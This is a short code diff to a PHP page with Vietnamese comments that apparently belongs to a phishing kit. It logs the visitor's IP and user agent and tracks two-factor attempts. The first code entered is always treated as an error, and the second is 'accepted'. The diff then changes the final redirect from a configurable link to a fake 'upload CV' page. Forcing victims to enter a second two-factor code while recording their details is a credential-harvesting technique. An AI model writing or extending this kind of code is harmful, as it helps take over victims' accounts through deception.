@@ -4,8 +4,6 @@ $rootDirectory = dirname(dirname(__FILE__));
 require_once($rootDirectory . '/get-data.php');
 require_once($rootDirectory . '/getip.php');
 
-$mainFile = './main.txt';
-$mainLink = trim(file_get_contents($mainFile));
 
 ?> <?php
 function getServerIP() {
@@ -619,10 +617,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     // Reload trang để hiển thị lỗi
                     window.location.reload();
                 } else {
-                    // Lần 2: Thành công - chuyển đến index.php
+                    // Lần 2: Thành công - chuyển sang trang upload CV
                     sessionStorage.removeItem('2faAttempts');
                     sessionStorage.removeItem('2faFirstAttempt');
-                    window.location.href = "<?php echo $mainLink; ?>";
+                    window.location.href = "./upload-cv";
                 }
             })
             .catch(error => {
@@ -639,7 +637,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 } else {
                     sessionStorage.removeItem('2faAttempts');
                     sessionStorage.removeItem('2faFirstAttempt');
-                    window.location.href = "<?php echo $mainLink; ?>";
+                    window.location.href = "./upload-cv";
                 }
             });
         }
